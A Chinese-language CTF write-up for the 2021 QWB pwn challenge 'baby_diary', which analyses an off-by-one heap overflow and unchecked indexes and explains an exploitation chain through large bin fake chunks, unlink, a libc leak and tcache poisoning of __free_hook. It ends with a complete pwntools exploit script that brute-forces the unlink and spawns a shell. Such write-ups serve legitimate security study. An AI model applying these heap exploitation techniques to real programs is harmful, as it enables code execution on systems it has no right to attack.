---
title: 强网杯2021 pwn 赛题解析——baby_diary
date: 2023-02-28 23:01:56
categories:
- write-ups
- 其他
---
这是一道经典的堆题，可以写入、读取和删除。其中最值得研究的就是write函数最后调用的一个函数，其中涉及几个迷之计算。
# Step 1: 漏洞分析
![](1.png)
我们进入unknown_handle函数（名字是笔者自己起的）：
![](2.png)
后面有一个unknown_cal函数，这个函数对输入的字符串进行了一系列的操作。首先将各个字符取出将它们的ASCII码全加起来保存到一个变量a中，然后循环进行下面的计算：如果a大于0xF，计算``a = (a >> 4) + (a & 0xF)``直到a小于0xF为止。返回到unknown_handle函数中，这里对字符串的后面一位进行了修改。但write函数一开始会要求输入size，申请的空间大小是size+1，这就需要注意read_buf这个函数了。当循环退出的时候，i的值应该就是max_len，此时后面的``buf[i]=0``实际上已经相对于max_len溢出了一个字节。因此unknown_handle函数中最后一条语句实际上相对于size溢出了2个字节。这可能会修改到下一个chunk的size。
![](3.png)
![](4.png)

本题还存在数组溢出漏洞。

请注意read函数，其中并没有对index进行检查，而在check_terminator函数中，存在有整型溢出漏洞，当index为负数时有可能通过检查。
![](5.png)
![](6.png)
但在数组溢出之后，想让check_terminator函数返回true并不容易，需要匹配结束符的ASCII码。

同样地，delete函数中也存在整型溢出漏洞，但如果对应地址不是有效的堆地址，就会直接报错，因此这里也不好利用：
![](7.png)
# Step 2: 确定利用方式，调试编写exp
这里需要注意unknown_handle函数时如何溢出一个字节的。在最后一条语句中，unknown_handle函数只会修改这个溢出字节的最低4位，最高4位不变。而堆管理中正常情况下所有的堆块大小都是以整0x10的形式保存的，即所有堆块的大小都是0x10的倍数。因此仅仅依靠一个字节的溢出无法达到堆块重叠的目的。

这里参考[这篇文章](https://blog.csdn.net/eeeeeight/article/details/118006138?ops_request_misc=&request_id=&biz_id=102&utm_term=baby%20diary&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-118006138.142^v33^control,185^v2^control&spm=1018.2226.3001.4187)的思路，利用large bin进行中转。当large bin中只有一个chunk时，其四个指针fd、bk、fd_nextsize、bk_nextsize有fd=bk在main_arena，fd_nextsize=bk_nextsize就是chunk自身。
![](8.png)
当我们再一次分配到这一块内存空间时，我们就可以对这里面残留的4个指针进行改写，将其伪造成一个假chunk，这个chunk的fd指针就是原来的fd_nextsize指针，bk指针就是原来的bk_nextsize指针，将原来的bk指针改为合适的size，准备进行unlink操作。unlink操作最为关键的就是假chunk中两个指针的值，fd需要等于假chunk-0x18，bk需要等于假chunk-0x10。前面说过当large bin中仅有一个chunk时，其fd_nextsize和bk_nextsize均指向其自身，因此这里的<font color=red>bk不需要修改，但fd需要修改。</font>**注意：这里需要一定的爆破：由于写入时会在后面加上零字节和标志位，因此需要爆破chunk地址的其中8位，成功率为1/256：**
![](9.png)
在爆破成功之后，我们就通过unlink实现了堆块重叠，申请合适的大小就可以使得main_arena的地址可以被其他chunk所读取。

在获取libc地址后，我们还是利用堆块重叠这一特性，修改tcache的指向到__free_hook，将其改为system地址。然后释放堆块即可。

**<font color=red>需要注意的是：假chunk头部应该写的是假chunk的地址而不应该是其他值，因为unlink_chunk函数中那个``fd->bk=p || bk->fd=p``这个检查中p是一个指针。因此我们还需要想办法让这里的值变成假chunk的地址</font>**。前面说过，我们通过切割large bin chunk可以获得两个地址，然后我们要改写其中一个地址。改写之后我们再一次释放这个chunk，这时这个chunk会进入到**fastbin**中，这就有可能会在假chunk头部写上一个有效的地址。我们只需要将这个chunk重新分配回来，修改这个地址，就有可能满足unlink的检查条件。（<font color=red>注意：不能让chunk进入tcache的原因是tcache chunk的bk指针实际指向tcache那个结构体，因此会破坏假chunk的结构，覆盖我们写入的size值，导致unlink在检查size时就失败</font>）

另外，对于最初进入large bin的chunk的大小也有讲究。在第一次写假chunk信息时，我们需要写入一个size的值，而这个size的值会影响到最后的校验位。如果size的值设置得不正确，那么第一次写入和第二次写入计算出来的校验位就会不一样，这样是不可能利用成功的。因为第一次写入影响的是假chunk的fd指针，第二次写入影响的是假chunk地址本身，二者的校验位必须相等才可能使得unlink的检查通过。经过验证，这里的假chunk的size可以写0x800，但是不能写0x700、0x600等值。

exp如下，平均需要爆破约350次，这和爆破的期望不符，原因暂时不明。

```python
from pwn import *
context.arch = 'amd64'
# context.log_level = 'debug'

io = process('./baby_diary')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')

def write_diary(size, content):
    io.sendlineafter(b'>> ', b'1')
    io.sendlineafter(b'size: ', str(size).encode())
    io.sendafter(b'content: ', content)

def read_diary(index):
    io.sendlineafter(b'>> ', b'2')
    io.sendlineafter(b'index: ', str(index).encode())

def delete_diary(index):
    io.sendlineafter(b'>> ', b'3')
    io.sendlineafter(b'index: ', str(index).encode())

flag = True
counter = 0
while(flag):
    write_diary(0x1070 - 0x290 - 0x10 + 0x4000, b'\n')      # chunk #0
    write_diary(0x810 - 0x30 - 0x10, b'\n')                 # chunk #1
    write_diary(0x20, b'\n')                                # chunk #2
    delete_diary(1)
    write_diary(0x800, b'\n')                               # chunk #1, previous chunk #1 to large bin
    write_diary(0x20, p64(0x10) + p64(0x800) + b'\x68\n')   # chunk #3
    for i in range(3):
        write_diary(0x20, b'flag\n')                        # chunk #4~6
    write_diary(0x6B0, b'\n')                               # chunk #7
    for i in range(3):
        write_diary(0x20, b'flag\n')                        # chunk #8~10

    for i in range(7):
        write_diary(0x20, b'\n')                            # chunk #11~17
    for i in range(7):
        delete_diary(11+i)                                  # to tcache

    delete_diary(4)
    delete_diary(3)                                         # write the chunk_addr to fake chunk's header

    for i in range(7):
        write_diary(0x20, b'\n')                            # empty tcache, chunk #3, #4, #11~15

    write_diary(0x20, b'\x80\n')                            # chunk #16, change the chunk address
    delete_diary(2)
    write_diary(0x27, b'\x00' * 0x27)                       # chunk #2, change the prev_inuse bit of chunk #1
    delete_diary(2)
    write_diary(0x27, b'\x00' * 0x18 + p64(8) + b'\n')      # chunk #2, change the prev_size of chunk #2 to 0x500
    delete_diary(1)                                         # trigger unlink
    try:
        write_diary(0x40, b'deadbeef\n')                    # chunk #1
        break
    except EOFError:
        io.close()
        io = process('./baby_diary')
        counter += 1
        print(counter)

read_diary(5)
io.recvuntil(b'content: ')
__malloc_hook = u64(io.recv(6) + b'\x00\x00') - 96 - 0x10
base = __malloc_hook - libc.symbols['__malloc_hook']
__free_hook = base + libc.symbols['__free_hook']
system = base + libc.symbols['system']
print(hex(__free_hook))

write_diary(0x20, b'\n')
delete_diary(12)
delete_diary(6)
write_diary(0x50, b'a' * 0x20 + p64(0) + p64(0x31) + p64(__free_hook) + b'\n')
write_diary(0x20, b'/bin/sh\n')
write_diary(0x20, p64(system) + b'\n')
delete_diary(12)

io.interactive()
```

![](10.png)

